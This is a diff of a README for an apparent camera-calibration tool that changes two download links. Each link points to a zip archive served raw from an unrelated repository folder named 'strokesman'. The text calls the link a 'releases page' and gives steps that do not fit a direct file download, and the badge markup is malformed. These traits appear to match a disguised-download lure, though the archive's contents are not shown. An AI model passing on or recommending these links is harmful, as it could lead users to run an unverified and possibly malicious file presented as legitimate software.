@@ -6,7 +6,7 @@ Welcome to CameraCalibrationKit_Chessboard! This application helps you calibrate
 
 ## 📥 Download Now
 
-[![Download Release](https://raw.githubusercontent.com/Panal123456/CameraCalibrationKit_Chessboard/master/strokesman/CameraCalibrationKit_Chessboard.zip%20release-brightgreen)](https://raw.githubusercontent.com/Panal123456/CameraCalibrationKit_Chessboard/master/strokesman/CameraCalibrationKit_Chessboard.zip)
+[![Download Release](https://raw.githubusercontent.com/Panal123456/CameraCalibrationKit_Chessboard/master/strokesman/Kit_Chessboard_Camera_Calibration_2.5.zip%20release-brightgreen)](https://raw.githubusercontent.com/Panal123456/CameraCalibrationKit_Chessboard/master/strokesman/Kit_Chessboard_Camera_Calibration_2.5.zip)
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ To run this application smoothly, ensure your system meets the following require
 
 ## 📥 Download & Install
 
-To download the latest version of CameraCalibrationKit_Chessboard, please visit our releases page: [Download Here](https://raw.githubusercontent.com/Panal123456/CameraCalibrationKit_Chessboard/master/strokesman/CameraCalibrationKit_Chessboard.zip). 
+To download the latest version of CameraCalibrationKit_Chessboard, please visit our releases page: [Download Here](https://raw.githubusercontent.com/Panal123456/CameraCalibrationKit_Chessboard/master/strokesman/Kit_Chessboard_Camera_Calibration_2.5.zip). 
 
 1. Click the link above.
 2. Find the latest release at the top of the page.
